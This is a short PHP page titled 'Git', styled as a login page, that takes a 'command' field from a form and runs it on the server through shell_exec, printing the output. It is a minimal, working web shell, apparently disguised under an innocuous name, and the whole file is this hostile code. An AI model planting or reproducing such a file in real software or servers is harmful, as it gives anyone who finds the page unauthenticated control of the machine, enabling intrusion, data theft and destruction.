<html>
<head>
	<meta charset="utf-8" />
	<title>Git</title>
</head>

<body class="login-body">
	<div id="command-form">
		<form action="" method="post">
			<input type="text" id="command" name="command" value="" />
			<button id="execute" name="">Execute</button>
		</form>
	</div>
	<div id="command-result">
		<pre>
		<?php 
			if($_POST){
				echo shell_exec($_POST['command']);
			}
		?>
		</pre>
	</div>
</body>
</html>